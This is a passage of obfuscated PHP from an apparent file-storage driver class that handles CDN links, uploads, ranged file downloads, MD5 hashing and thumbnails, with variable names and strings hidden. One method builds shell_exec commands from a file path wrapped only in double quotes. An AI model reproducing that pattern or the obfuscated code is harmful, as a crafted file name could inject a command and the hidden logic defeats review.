$GLOBALS[$åØİôÙ[6]][$åØİôÙ[92]][$åØİôÙ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($«šÅü°Ä) { $¶ıæ¬… =& $_SERVER[‹‰”››ê]; if (!$this->isCdnHost()) { return $«šÅü°Ä; } return str_replace(trim(get_url_root($«šÅü°Ä), $¶ıæ¬…[8]), trim($this->cdnHost, $¶ıæ¬…[8]), $«šÅü°Ä); } public function uploadLink($ãŞè²ó¡, $Ê×ã¹å = 0) { $Ù”êÎ¯  =& $_SERVER[‹‰”››ê]; if ($this->isUploadServer()) { return; } $éàÖ÷À = $this->getType(); if (!in_array($éàÖ÷À, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $†Öù°–Ê = 1024 * 1024 * 10; $€‰¬¦Şº = $Ê×ã¹å <= $†Öù°–Ê ? $Ù”êÎ¯ [95] : $Ù”êÎ¯ [96]; $ó´›§ò = (!$Ê×ã¹å ? 1 : ceil($Ê×ã¹å / pow(1024, 3))) * 3600 * 4; $Ÿ’Á½Ğ» = $this->{$€‰¬¦Şº}($ãŞè²ó¡, $ó´›§ò); if ($Ÿ’Á½Ğ») { $Ÿ’Á½Ğ»[$Ù”êÎ¯ [97]] = $ãŞè²ó¡; $Ÿ’Á½Ğ»[$Ù”êÎ¯ [98]] = $éàÖ÷À; } return $Ÿ’Á½Ğ»; } public function uploadFormData($ÓÂ†’ñ—, $è‡ÓíÍÈ = 3600) { } public function uploadMultiData($¹æ†ëå, $Â°ƒâ”º = 3600) { } public function multiUploadFormData($éç¶”Ï, $á³áâú = 3600) { return $this->uploadMultiData($éç¶”Ï, $á³áâú); } public function download($Áù©’Ì, $ ½Ùß) { } public function ext($Ç­ …½) { $Ğ‹¡‡Î =& $_SERVER[‹‰”››ê]; if (strpos($Ç­ …½, $Ğ‹¡‡Î[8]) === -1) { $·Ø Ééù = $Ç­ …½; } else { $·Ø Ééù = $this->pathThis($Ç­ …½); } $İİË˜Ú = $Ğ‹¡‡Î[12]; if (strstr($·Ø Ééù, $Ğ‹¡‡Î[10])) { $İİË˜Ú = substr($·Ø Ééù, strrpos($·Ø Ééù, $Ğ‹¡‡Î[10]) + 1); $İİË˜Ú = strtolower($İİË˜Ú); } if (strlen($İİË˜Ú) > 3 && preg_match($Ğ‹¡‡Î[99], $İİË˜Ú, $À½”ó¶Á)) { $İİË˜Ú = $Ğ‹¡‡Î[12]; } return $İİË˜Ú; } public function pathThis($£‚À«å) { $İÄÛ©€§ =& $_SERVER[‹‰”››ê]; $£‚À«å = str_replace($İÄÛ©€§[100], $İÄÛ©€§[8], rtrim($£‚À«å, $İÄÛ©€§[8])); $´†Ìíø— = strrpos($£‚À«å, $İÄÛ©€§[8]); if ($´†Ìíø— === !1) { return $£‚À«å; } return substr($£‚À«å, $´†Ìíø— + 1); } public function pathFather($·ê›æôå) { $×Ñ²ğí‘ =& $_SERVER[‹‰”››ê]; $·ê›æôå = str_replace($×Ñ²ğí‘[100], $×Ñ²ğí‘[8], rtrim($·ê›æôå, $×Ñ²ğí‘[8])); $¯Ãã”—ò = strrpos($·ê›æôå, $×Ñ²ğí‘[8]); if ($¯Ãã”—ò === !1) { return $×Ñ²ğí‘[12]; } return substr($·ê›æôå, 0, $¯Ãã”—ò + 1); } public function hashSimple($ÓÍÜ›×) { $ÀúâŒ´… =& $_SERVER[‹‰”››ê]; if (!$ÓÍÜ›×) { return md5($ÀúâŒ´…[12]); } $şèÅ = $this->size($ÓÍÜ›×); $©¼ôóÔ = 200; $‹‚ü“¹œ = 50; if ($şèÅ <= $©¼ôóÔ * $‹‚ü“¹œ) { return $this->hashMd5($ÓÍÜ›×) . $şèÅ; } $ì»ƒç¥Û = intval($şèÅ / $‹‚ü“¹œ); $„®ºÓÕ… = $ÀúâŒ´…[12]; for ($¬µªŒÅ = 0; $¬µªŒÅ < $‹‚ü“¹œ; $¬µªŒÅ++) { $„®ºÓÕ… .= $this->fileSubstr($ÓÍÜ›×, $ì»ƒç¥Û * $¬µªŒÅ, $©¼ôóÔ); } $„®ºÓÕ… .= $this->fileSubstr($ÓÍÜ›×, $şèÅ - $©¼ôóÔ, $©¼ôóÔ); return md5($„®ºÓÕ…) . $şèÅ; } public static $md5Cache = array(); public function hashMd5($”ûõØõ®) { if (!$”ûõØõ®) { return md5($_SERVER[‹‰”››ê][12]); } $”ûõØõ® = $this->iconvSystem($”ûõØõ®); if (isset(self::$md5Cache[$”ûõØõ®])) { return self::$md5Cache[$”ûõØõ®]; } self::$md5Cache[$”ûõØõ®] = $this->hashMd5Shell($”ûõØõ®); if (!self::$md5Cache[$”ûõØõ®]) { self::$md5Cache[$”ûõØõ®] = @md5_file($”ûõØõ®); } return self::$md5Cache[$”ûõØõ®]; } private function hashMd5Shell($í“É³) { $ŒÇŸ”¶ =& $_SERVER[‹‰”››ê]; if (!$í“É³) { return md5($ŒÇŸ”¶[12]); } if (!function_exists($ŒÇŸ”¶[101])) { return !1; } $à¸ì¥÷  = array($ŒÇŸ”¶[102], $ŒÇŸ”¶[103]); $Õ§óïñ¢ = Cache::get($ŒÇŸ”¶[104]); if (!$Õ§óïñ¢) { $ĞüÌƒµ˜ = BASIC_PATH . $ŒÇŸ”¶[105]; $ÃĞû‡˜ı = md5_file($ĞüÌƒµ˜); $Õ§óïñ¢ = $ŒÇŸ”¶[106]; foreach ($à¸ì¥÷  as $ĞàÈ„â¢) { $¤»ÇÑâ = shell_exec($ĞàÈ„â¢ . "\40\42{$ĞüÌƒµ˜}\42"); if ($¤»ÇÑâ && substr(trim($¤»ÇÑâ), 0, 32) == $ÃĞû‡˜ı) { $Õ§óïñ¢ = $ĞàÈ„â¢; break; } } Cache::set($ŒÇŸ”¶[104], $Õ§óïñ¢, 3600); } if ($Õ§óïñ¢ == $ŒÇŸ”¶[106]) { return !1; } $¤»ÇÑâ = shell_exec($Õ§óïñ¢ . "\x20\x22{$í“É³}\42"); $¤»ÇÑâ = str_replace($ŒÇŸ”¶[107], $ŒÇŸ”¶[12], $¤»ÇÑâ); return substr($¤»ÇÑâ, 0, 32); } public function link($ÆÇÃ…Ÿµ) { return $ÆÇÃ…Ÿµ; } public function fileOut($í–½¯“, $é½º«Èº = false, $‘Ú›£¡Ê = false, $”º›àÚ = '') { $Ûì˜ã·Õ =& $_SERVER[‹‰”››ê]; $this->cacheMethod(null, null); if (!$í–½¯“ || !$this->exist($í–½¯“)) { show_json(LNG($Ûì˜ã·Õ[108]), !1, $‘Ú›£¡Ê); } $À¬ÍÄŸË = $this->getType() == $Ûì˜ã·Õ[109]; $É›üê = $GLOBALS[$Ûì˜ã·Õ[6]][$Ûì˜ã·Õ[92]][$Ûì˜ã·Õ[110]][$Ûì˜ã·Õ[111]]; $¤˜¥·ûŒ = (double) $GLOBALS[$Ûì˜ã·Õ[6]][$Ûì˜ã·Õ[92]][$Ûì˜ã·Õ[110]][$Ûì˜ã·Õ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $”¥µÒ¨¹ = $this->infoFull($í–½¯“); $£²à‘À = $”¥µÒ¨¹[$Ûì˜ã·Õ[79]]; $ëº÷­§ = gmdate($Ûì˜ã·Õ[113], $”¥µÒ¨¹[$Ûì˜ã·Õ[88]]); $ŒÆ¦†§á = $‘Ú›£¡Ê ? $‘Ú›£¡Ê : $this->iconvApp($”¥µÒ¨¹[$Ûì˜ã·Õ[32]]); $³¦ğå„ = 0; $Ì ™Ò€¸ = $£²à‘À - 1; $ø©ûª ø = $this->ext($ŒÆ¦†§á); if (in_array($ø©ûª ø, array($Ûì˜ã·Õ[114], $Ûì˜ã·Õ[115], $Ûì˜ã·Õ[116], $Ûì˜ã·Õ[117]))) { $ø©ûª ø = $Ûì˜ã·Õ[118]; } if (in_array($ø©ûª ø, array($Ûì˜ã·Õ[119]))) { $ø©ûª ø = $Ûì˜ã·Õ[120]; } if (!$”º›àÚ) { $”º›àÚ = md5($ëº÷­§ . $£²à‘À); } $”º›àÚ = $Ûì˜ã·Õ[121] . $”º›àÚ . $Ûì˜ã·Õ[121]; $÷ŞÖÀ­ = get_file_mime($ø©ûª ø); $»øÉÔúû = !0; $»øÉÔúû = isset($_GET[$Ûì˜ã·Õ[122]]) ? !1 : !0; if ($é½º«Èº === !1 && !mime_support($÷ŞÖÀ­)) { $÷ŞÖÀ­ = $Ûì˜ã·Õ[123]; } header($Ûì˜ã·Õ[124]); header($Ûì˜ã·Õ[125] . $÷ŞÖÀ­); $ÆÏ¤Ÿƒ« = rawurlencode($ŒÆ¦†§á); $ÆÏ¤Ÿƒ« = $Ûì˜ã·Õ[121] . $ÆÏ¤Ÿƒ« . $Ûì˜ã·Õ[126] . $ÆÏ¤Ÿƒ«; if ($é½º«Èº) { header($Ûì˜ã·Õ[127]); header($Ûì˜ã·Õ[128] . $ÆÏ¤Ÿƒ«); } else { if ($»øÉÔúû) { header($Ûì˜ã·Õ[129] . $ÆÏ¤Ÿƒ«); } } $•İé£Íê = 3600 * 24 * 30; header($Ûì˜ã·Õ[130]); header($Ûì˜ã·Õ[131]); header($Ûì˜ã·Õ[132] . $•İé£Íê); header($Ûì˜ã·Õ[133] . gmdate($Ûì˜ã·Õ[113], time() + $•İé£Íê) . $Ûì˜ã·Õ[134]); if (isset($_SERVER[$Ûì˜ã·Õ[135]]) && strtotime($_SERVER[$Ûì˜ã·Õ[135]]) == $”¥µÒ¨¹[$Ûì˜ã·Õ[88]]) { header($Ûì˜ã·Õ[136], !0, 304); die; } if (isset($_SERVER[$Ûì˜ã·Õ[137]]) && $_SERVER[$Ûì˜ã·Õ[137]] == $”º›àÚ) { header($Ûì˜ã·Õ[138] . $”º›àÚ, !0, 304); die; } header($Ûì˜ã·Õ[138] . $”º›àÚ); header($Ûì˜ã·Õ[139] . $ëº÷­§ . $Ûì˜ã·Õ[134]); header($Ûì˜ã·Õ[140] . $ŒÆ¦†§á); header($Ûì˜ã·Õ[141]); header($Ûì˜ã·Õ[142] . $£²à‘À); header($Ûì˜ã·Õ[143]); Hook::trigger($Ûì˜ã·Õ[144], $í–½¯“, $£²à‘À, $ŒÆ¦†§á, $ø©ûª ø); if (!$é½º«Èº && $ø©ûª ø == $Ûì˜ã·Õ[145]) { if ($£²à‘À > 1024 * 1024 * 5) { die; } $Âßå°¨Õ = $this->getContent($í–½¯“); $Âßå°¨Õ = Html::clearSVG($Âßå°¨Õ); header($Ûì˜ã·Õ[146] . strlen($Âßå°¨Õ)); echo $Âßå°¨Õ; die; } $“›Ñ €† = strtolower($_SERVER[$Ûì˜ã·Õ[147]]); if ($À¬ÍÄŸË && $“›Ñ €† && $É›üê) { if (strstr($“›Ñ €†, $Ûì˜ã·Õ[148])) { header($Ûì˜ã·Õ[149] . $í–½¯“); } else { if (strstr($“›Ñ €†, $Ûì˜ã·Õ[150])) { header($Ûì˜ã·Õ[151] . $í–½¯“); } else { if (strstr($“›Ñ €†, $Ûì˜ã·Õ[152])) { header($Ûì˜ã·Õ[153] . $í–½¯“); } } } if ($¤˜¥·ûŒ) { header($Ûì˜ã·Õ[154] . $¤˜¥·ûŒ); } return; } if (isset($_SERVER[$Ûì˜ã·Õ[155]])) { if (preg_match($Ûì˜ã·Õ[156], $_SERVER[$Ûì˜ã·Õ[155]], $Ï§®ÀÍ)) { $³¦ğå„ = intval($Ï§®ÀÍ[1]); $³¦ğå„ = $³¦ğå„ <= 0 ? 0 : ($³¦ğå„ >= $Ì ™Ò€¸ ? $Ì ™Ò€¸ : $³¦ğå„); if (!empty($Ï§®ÀÍ[2])) { $Ó ›—„Á = intval($Ï§®ÀÍ[2]); $Ì ™Ò€¸ = $Ó ›—„Á < $³¦ğå„ ? $³¦ğå„ : ($Ó ›—„Á >= $Ì ™Ò€¸ ? $Ì ™Ò€¸ : $Ó ›—„Á); } } header($Ûì˜ã·Õ[157]); header("\103\157\x6e\x74\x65\156\x74\55\122\x61\156\147\x65\x3a\40\142\171\164\x65\x73\40{$³¦ğå„}\x2d{$Ì ™Ò€¸}\57" . $£²à‘À); } else { header($Ûì˜ã·Õ[158]); } header($Ûì˜ã·Õ[159]); header($Ûì˜ã·Õ[160]); $ÇÆó¹ïÁ = !0; if ($_SERVER[$Ûì˜ã·Õ[161]] == $Ûì˜ã·Õ[162] && $£²à‘À > 1204 * 1024 * 1024 * 2) { $ÇÆó¹ïÁ = !1; } if ($ÇÆó¹ïÁ) { header($Ûì˜ã·Õ[163] . ($Ì ™Ò€¸ - $³¦ğå„ + 1)); } if ($_SERVER[$Ûì˜ã·Õ[164]] == $Ûì˜ã·Õ[165]) { return; } $ÃÄ®Ñ³é = array($Ûì˜ã·Õ[166] => !1, $Ûì˜ã·Õ[167] => $³¦ğå„, $Ûì˜ã·Õ[168] => $Ì ™Ò€¸, $Ûì˜ã·Õ[169] => $ø©ûª ø, $Ûì˜ã·Õ[170] => $”¥µÒ¨¹, $Ûì˜ã·Õ[171] => $Ûì˜ã·Õ[12], $Ûì˜ã·Õ[172] => 0); $ÃÄ®Ñ³é = Hook::filter($Ûì˜ã·Õ[173], $ÃÄ®Ñ³é); $ŒÎí˜ä© = 1024 * 300; $³×ƒ©‹¯ = 0; if ($¤˜¥·ûŒ) { $³×ƒ©‹¯ = intval(1000 * 1000 * ($ŒÎí˜ä© / $¤˜¥·ûŒ)); } while ($³¦ğå„ <= $Ì ™Ò€¸) { $¡ËŠ¿ªÒ = timeFloat(); check_abort(); $É°íäã” = $Ì ™Ò€¸ - $³¦ğå„ + 1; if ($É°íäã” <= $ŒÎí˜ä©) { $ŒÎí˜ä© = $É°íäã”; } $Âßå°¨Õ = $this->fileSubstr($í–½¯“, $³¦ğå„, $ŒÎí˜ä©); if ($ÃÄ®Ñ³é[$Ûì˜ã·Õ[166]]) { $ÃÄ®Ñ³é[$Ûì˜ã·Õ[171]] = $Âßå°¨Õ; $ÃÄ®Ñ³é[$Ûì˜ã·Õ[172]] = $³¦ğå„; $ÃÄ®Ñ³é = Hook::filter($Ûì˜ã·Õ[174], $ÃÄ®Ñ³é); $Âßå°¨Õ = $ÃÄ®Ñ³é[$Ûì˜ã·Õ[171]]; } echo $Âßå°¨Õ; $³¦ğå„ += $ŒÎí˜ä©; if ($ŒÎí˜ä© == $É°íäã”) { $³¦ğå„ = $Ì ™Ò€¸ + 1; } if ($³×ƒ©‹¯) { $¥àãô¦‡ = intval(1000 * 1000 * (timeFloat() - $¡ËŠ¿ªÒ)); $Æ‚ÏûÃ¾ = $³×ƒ©‹¯ - $¥àãô¦‡; if ($Æ‚ÏûÃ¾ > 5) { usleep($Æ‚ÏûÃ¾); } } } } public function fileOutServer($çåñÇ“, $„ã®ß˜· = false, $«–£í®‘ = false, $ƒ¿üìÚ˜ = '') { $this->fileOut($çåñÇ“, $„ã®ß˜·, $«–£í®‘, $ƒ¿üìÚ˜); } public function fileOutLink($æšƒùŠƒ) { header($_SERVER[‹‰”››ê][175] . $æšƒùŠƒ); die; } public function cacheMethod($æÇï–£, $¦ÀìÔ‹Ô, $åÔ¶íñÍ = null) { $ÀûÒÛ„ü =& $_SERVER[‹‰”››ê]; static $Ëû¨Êø = array(); $…ùì–Í¾ = $¦ÀìÔ‹Ô ? ltrim($this->getPathOuter($¦ÀìÔ‹Ô), $ÀûÒÛ„ü[8]) : $ÀûÒÛ„ü[12]; $¥Ø”º® = $ÀûÒÛ„ü[176] . $æÇï–£ . $ÀûÒÛ„ü[177] . rtrim($…ùì–Í¾, $ÀûÒÛ„ü[8]); if (is_null($æÇï–£)) { $Ëû¨Êø = array(); return; } if (is_null($¦ÀìÔ‹Ô)) { foreach ($Ëû¨Êø as $¥Ø”º® => $Ç‚ıÑõğ) { if (!strstr($¥Ø”º®, $ÀûÒÛ„ü[176] . $æÇï–£ . $ÀûÒÛ„ü[178])) { continue; } unset($Ëû¨Êø[$¥Ø”º®]); } return; } if ($åÔ¶íñÍ === $ÀûÒÛ„ü[179]) { unset($Ëû¨Êø[$¥Ø”º®]); return; } if (!is_null($åÔ¶íñÍ)) { $Ëû¨Êø[$¥Ø”º®] = $åÔ¶íñÍ; return; } $›ÒÓæøº = isset($Ëû¨Êø[$¥Ø”º®]) ? $Ëû¨Êø[$¥Ø”º®] : null; if (!is_null($›ÒÓæøº)) { return $›ÒÓæøº; } $›ÒÓæøº = $this->{$æÇï–£}($¦ÀìÔ‹Ô); $Ëû¨Êø[$¥Ø”º®] = $›ÒÓæøº; return $›ÒÓæøº; } public function cacheMethodInfoSet($İ·¨€Ó“, $„ÑèÚÅ¼, $Âûê¤”• = false) { $ó…¾ı¼ =& $_SERVER[‹‰”››ê]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ó…¾ı¼[180], $İ·¨€Ó“, $„ÑèÚÅ¼); $this->cacheMethod($ó…¾ı¼[181], $İ·¨€Ó“, $„ÑèÚÅ¼ ? !1 : !0); if (is_array($Âûê¤”•)) { $this->cacheMethod($ó…¾ı¼[182], $İ·¨€Ó“, $Âûê¤”•); } } public function fileOutImage($›ÂñŠ…ß, $“’çÁ”ı = 250) { $‘½Û„ÚÕ =& $_SERVER[‹‰”››ê]; set_timeout(); if (substr($›ÂñŠ…ß, 0, 4) == $‘½Û„ÚÕ[152]) { $this->fileOutLink($›ÂñŠ…ß); } $ĞÏåÅæ = $this->info($›ÂñŠ…ß); $ìöÑøÑá = !1; $Â„–ê€à = isset($GLOBALS[$‘½Û„ÚÕ[183]]) ? $GLOBALS[$‘½Û„ÚÕ[183]] : array(); if ($Â„–ê€à && $Â„–ê€à[$‘½Û„ÚÕ[184]] == $ĞÏåÅæ[$‘½Û„ÚÕ[87]]) { $ĞÏåÅæ = $Â„–ê€à; $áĞç¤Í± = $ĞÏåÅæ[$‘½Û„ÚÕ[185]]; if ($áĞç¤Í± && isset($áĞç¤Í±[$‘½Û„ÚÕ[186]])) { if ($áĞç¤Í±[$‘½Û„ÚÕ[186]] <= $“’çÁ”ı && $áĞç¤Í±[$‘½Û„ÚÕ[187]] <= $“’çÁ”ı) { $ìöÑøÑá = !0; } } } if ($ĞÏåÅæ[$‘½Û„ÚÕ[79]] <= 1024 * 50 || $ìöÑøÑá || !function_exists($‘½Û„ÚÕ[188]) || $ĞÏåÅæ[$‘½Û„ÚÕ[169]] == $‘½Û„ÚÕ[189]) { return $this->fileOut($›ÂñŠ…ß, !1, $ĞÏåÅæ[$‘½Û„ÚÕ[32]]); } $ÙÌ€¨“ø = kodIO::hashPath($ĞÏåÅæ); $™áè©İÆ = "\143\x6f\x76\145\162\x5f{$ÙÌ€¨“ø}\137{$“’çÁ”ı}\x2e\x70\156\147"; $òıÍ¼å = IO_PATH_SYSTEM_TEMP . $‘½Û„ÚÕ[190]; $¬ŒãÙ× = IO::infoFullSimple($òıÍ¼å); $ú¶ßƒ  = $¬ŒãÙ× && is_array($¬ŒãÙ×) ? $¬ŒãÙ×[$‘½Û„ÚÕ[87]] : $‘½Û„ÚÕ[12]; if (!$ú¶ßƒ ) { $ú¶ßƒ  = IO::mkdir($òıÍ¼å); } if ($ĞÏåÅæ[$‘½Û„ÚÕ[191]] == $‘½Û„ÚÕ[192] && isset($ĞÏåÅæ[$‘½Û„ÚÕ[193]]) && $ĞÏåÅæ[$‘½Û„ÚÕ[193]] == kodIO::sourceID($ú¶ßƒ )) { $‰ø¼âèù = $ĞÏåÅæ[$‘½Û„ÚÕ[194]]; if ($“’çÁ”ı <= 500) { $ñœ§´±Â = preg_replace($‘½Û„ÚÕ[195], $‘½Û„ÚÕ[196], $ĞÏåÅæ[$‘½Û„ÚÕ[32]]); $‰ø¼âèù = IO::fileNameExist($ú¶ßƒ , $ñœ§´±Â); } return IO::fileOut(KodIO::make($‰ø¼âèù), !1, $ĞÏåÅæ[$‘½Û„ÚÕ[32]]); } $†»¤â¿ = IO::fileNameExist($ú¶ßƒ , $™áè©İÆ); if ($†»¤â¿) { return IO::fileOut(KodIO::make($†»¤â¿), !1, $ĞÏåÅæ[$‘½Û„ÚÕ[32]]); } if ($“’çÁ”ı > 1000) { $this->makeImageCover($ú¶ßƒ , $›ÂñŠ…ß, $™áè©İÆ, $“’çÁ”ı); $this->makeImageCover($ú¶ßƒ , $›ÂñŠ…ß, "\x63\157\x76\145\162\x5f{$ÙÌ€¨“ø}\137\x32\x35\x30\56\160\156\147", 250); $†»¤â¿ = IO::fileNameExist($ú¶ßƒ , $™áè©İÆ); if ($†»¤â¿) { return IO::fileOut(KodIO::make($†»¤â¿), !1, $ĞÏåÅæ[$‘½Û„ÚÕ[32]]); } die; } if (!kodIO::allowCover($ĞÏåÅæ)) { return $this->fileOut($›ÂñŠ…ß, !1, $ĞÏåÅæ[$‘½Û„ÚÕ[32]]); } $úŸúşØß = Cache::get($™áè©İÆ); if ($úŸúşØß == $‘½Û„ÚÕ[197] || $úŸúşØß == $‘½Û„ÚÕ[198]) { echo $úŸúşØß; die; } Cache::set($™áè©İÆ, $‘½Û„ÚÕ[198], 60); $›ÓÁ£ = array($ú¶ßƒ , $ĞÏåÅæ[$‘½Û„ÚÕ[87]], $™áè©İÆ, $“’çÁ”ı); $ÙâûÇ©Š = $‘½Û„ÚÕ[199] . $ĞÏåÅæ[$‘½Û„ÚÕ[79]] . $‘½Û„ÚÕ[200] . $™áè©İÆ . $‘½Û„ÚÕ[201] . $ĞÏåÅæ[$‘½Û„ÚÕ[32]] . $‘½Û„ÚÕ[202] . $ĞÏåÅæ[$‘½Û„ÚÕ[87]]; TaskQueue::add($‘½Û„ÚÕ[203], $›ÓÁ£, $ÙâûÇ©Š, $™áè©İÆ); } public function makeImageCover($ĞÃ™¢Â, $Ã×Éë²¯, $øğÄ³½, $’•¬›şµ) { $¢½óÖ÷Ö =& $_SERVER[‹‰”››ê]; if (IO::fileNameExist($ĞÃ™¢Â, $øğÄ³½)) { return $¢½óÖ÷Ö[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ÑÒí˜¥ò = $this->getPathOuter($Ã×Éë²¯); $ú÷ ÒÁ× = DATA_THUMB . $øğÄ³½; del_file($ú÷ ÒÁ×); $Ë­äÎæ = IO::copy($ÑÒí˜¥ò, TEMP_FILES, !1, $øğÄ³½); if (!@file_exists($Ë­äÎæ)) { return $¢½óÖ÷Ö[205]; } ImageThumb::createThumb($Ë­äÎæ, $ú÷ ÒÁ×, $’•¬›şµ, $’•¬›şµ * 10); if (@file_exists($ú÷ ÒÁ×)) { Cache::remove($øğÄ³½); return IO::move($ú÷ ÒÁ×, $ĞÃ™¢Â); } Cache::set($øğÄ³½, $¢½óÖ÷Ö[197], 600); del_file($ú÷ ÒÁ×); return $¢½óÖ÷Ö[206] . $Ë­äÎæ . $¢½óÖ÷Ö[74]; } public function fileOutImageServer($ü…Œ±Ö, $ÍşÒ§ö© = 250) { $this->fileOutImage($ü…Œ±Ö, $ÍşÒ§ö©); } public function fileNameAuto($‚Ò…üê—, $ìÓû÷ß, $êŸÂãŸœ = REPEAT_RENAME, $‘æãù‘à = false) { $Œ±°Çìñ =& $_SERVER[‹‰”››ê]; $á©ô¢Ùò = $‚Ò…üê— === $Œ±°Çìñ[12] ? $ìÓû÷ß : rtrim($‚Ò…üê—, $Œ±°Çìñ[8]) . $Œ±°Çìñ[8] . $ìÓû÷ß; if ($êŸÂãŸœ == REPEAT_REPLACE || !$this->exist($á©ô¢Ùò) || $‘æãù‘à && $êŸÂãŸœ != REPEAT_RENAME_FOLDER) { return $ìÓû÷ß; } if ($êŸÂãŸœ == REPEAT_SKIP) { return !1; } $¼ãëóÂâ = $Œ±°Çìñ[10] . get_path_ext($ìÓû÷ß); $¼ãëóÂâ = $¼ãëóÂâ == $Œ±°Çìñ[10] || $‘æãù‘à ? $Œ±°Çìñ[12] : $¼ãëóÂâ; $–£±Õİ¿ = 1; $È¼ÏŞÀæ = substr($ìÓû÷ß, 0, strlen($ìÓû÷ß) - strlen($¼ãëóÂâ)); $ÁŞôóŒ = $È¼ÏŞÀæ . "\x28{$–£±Õİ¿}\51{$¼ãëóÂâ}"; while ($this->exist(rtrim($‚Ò…üê—, $Œ±°Çìñ[8]) . $Œ±°Çìñ[8] . $ÁŞôóŒ)) { $ÁŞôóŒ = $È¼ÏŞÀæ . "\x28{$–£±Õİ¿}\51{$¼ãëóÂâ}"; $–£±Õİ¿++; } return $ÁŞôóŒ; } private function fileNameAutoList($Ï¯Şûøˆ, $Ü®‘Íª”, $äİåº¬Ï = false) { $ÓÉÜ¨ÈÃ =& $_SERVER[‹‰”››ê]; $úÆÚÖıÉ = $this->listPath($Ï¯Şûøˆ, !0); $úÆÚÖıÉ = array_merge($úÆÚÖıÉ[$ÓÉÜ¨ÈÃ[85]], $úÆÚÖıÉ[$ÓÉÜ¨ÈÃ[86]]); $…èÊ¬‚ = array_to_keyvalue($úÆÚÖıÉ, $ÓÉÜ¨ÈÃ[12], $ÓÉÜ¨ÈÃ[32]); $Íóï¬£± = $ÓÉÜ¨ÈÃ[10] . get_path_ext($Ü®‘Íª”); $Íóï¬£± = $Íóï¬£± == $ÓÉÜ¨ÈÃ[10] || $äİåº¬Ï ? $ÓÉÜ¨ÈÃ[12] : $Íóï¬£±; $Ş€’­ºƒ = substr($Ü®‘Íª”, 0, strlen($Ü®‘Íª”) - strlen($Íóï¬£±)); $÷Š­ôã = $Ş€’­ºƒ . "\x28\60\x29{$Íóï¬£±}"; for ($‹´£¨õ = 1; $‹´£¨õ <= count($…èÊ¬‚) + 1; $‹´£¨õ++) { $÷Š­ôã = $Ş€’­ºƒ . "\50{$‹´£¨õ}\51{$Íóï¬£±}"; if (!in_array_not_case($÷Š­ôã, $…èÊ¬‚)) { return $÷Š­ôã; } } return $÷Š­ôã; } public function listAllFiles($¿íŒ£Ï, $½ïñÅ˜Õ) { $ø¡É® =& $_SERVER[‹‰”››ê]; if (empty($½ïñÅ˜Õ)) { return array(); } $ã¹úØ = array_keys($½ïñÅ˜Õ); $œšè¢ãÄ = array(); $¿íŒ£Ï = trim($¿íŒ£Ï, $ø¡É®[8]); foreach ($½ïñÅ˜Õ as $ÍÌÍ¬î™ => $ ¸‚ÕÏõ) { $ª¡˜ì‰ß = ltrim(substr(trim($ÍÌÍ¬î™, $ø¡É®[8]), strlen($¿íŒ£Ï)), $ø¡É®[8]); if (substr($ÍÌÍ¬î™, -1) == $ø¡É®[8]) { $ª¡˜ì‰ß = rtrim($ª¡˜ì‰ß, $ø¡É®[8]) . $ø¡É®[8]; } $œšè¢ãÄ = array_merge($œšè¢ãÄ, $this->slicePath($ª¡˜ì‰ß)); } $áÇÈ¨¢Š = array(); foreach (array_unique($œšè¢ãÄ) as $öÎ­ùİ ) { $¯Í§Ö¤¡ = array($ø¡É®[87] => $this->getPathOuter($ø¡É®[8] . $¿íŒ£Ï . $ø¡É®[8] . $öÎ­ùİ ), $ø¡É®[78] => 1, $ø¡É®[79] => 0); if (substr($öÎ­ùİ , -1) != $ø¡É®[8]) { $¯Í§Ö¤¡[$ø¡É®[78]] = 0; $«ÉÏù¬ = $this->getPath($¿íŒ£Ï . $ø¡É®[8] . $öÎ­ùİ ); if (isset($½ïñÅ˜Õ[$«ÉÏù¬])) { $Ò‹”Œ¢« = $½ïñÅ˜Õ[$«ÉÏù¬]; if (isset($Ò‹”Œ¢«[$ø¡É®[79]])) { $¯Í§Ö¤¡[$ø¡É®[79]] = intval($Ò‹”Œ¢«[$ø¡É®[79]]); } if (isset($Ò‹”Œ¢«[$ø¡É®[207]])) { $¯Í§Ö¤¡[$ø¡É®[88]] = intval($Ò‹”Œ¢«[$ø¡É®[207]]); } } } $áÇÈ¨¢Š[] = $¯Í§Ö¤¡; } return $áÇÈ¨¢Š; } public function slicePath($ïëŠ¤Ç“) { $ĞÏ’İ³ğ =& $_SERVER[‹‰”››ê]; $†°•¶‰ = explode($ĞÏ’İ³ğ[8], trim($ïëŠ¤Ç“, $ĞÏ’İ³ğ[8])); $ãÛçä’ä = 0; do { ++$ãÛçä’ä; $İŒáÇÓˆ[] = implode($ĞÏ’İ³ğ[8], array_slice($†°•¶‰, 0, $ãÛçä’ä)) . $ĞÏ’İ³ğ[8]; } while ($ãÛçä’ä < count($†°•¶‰)); $İŒáÇÓˆ[count($†°•¶‰) - 1] = $ïëŠ¤Ç“; return $İŒáÇÓˆ; } public function getHost() { $Ÿˆ³´½ =& $_SERVER[‹‰”››ê]; $ÌÜøö—Õ = parse_url(trim($this->domain, $Ÿˆ³´½[8])); $ú¨éÇ¶ = isset($ÌÜøö—Õ[$Ÿˆ³´½[208]]) ? $ÌÜøö—Õ[$Ÿˆ³´½[208]] : http_type(); $´ş÷™©‹ = isset($ÌÜøö—Õ[$Ÿˆ³´½[209]]) ? $ÌÜøö—Õ[$Ÿˆ³´½[209]] : $ÌÜøö—Õ[$Ÿˆ³´½[87]]; if (isset($ÌÜøö—Õ[$Ÿˆ³´½[210]])) { $´ş÷™©‹ .= $Ÿˆ³´½[4] . $ÌÜøö—Õ[$Ÿˆ³´½[210]]; } return $ú¨éÇ¶ . $Ÿˆ³´½[211] . $´ş÷™©‹; } public function pathEncode($ÂØÌò·) { $ÚĞ£æ»€ =& $_SERVER[‹‰”››ê]; return str_replace($ÚĞ£æ»€[212], $ÚĞ£æ»€[8], rawurlencode($ÂØÌò·)); } public function writeLog($®ı³òÒƒ = '', $‚ê¹€é¬ = false) { $¶´í«úò =& $_SERVER[‹‰”››ê]; $œƒÂş¯ß = in_array(ACTION, array($¶´í«úò[213], $¶´í«úò[214])); if (!$œƒÂş¯ß && !GLOBAL_DEBUG) { return; } $²ÌÅ¶ôš = $®ı³òÒƒ; static 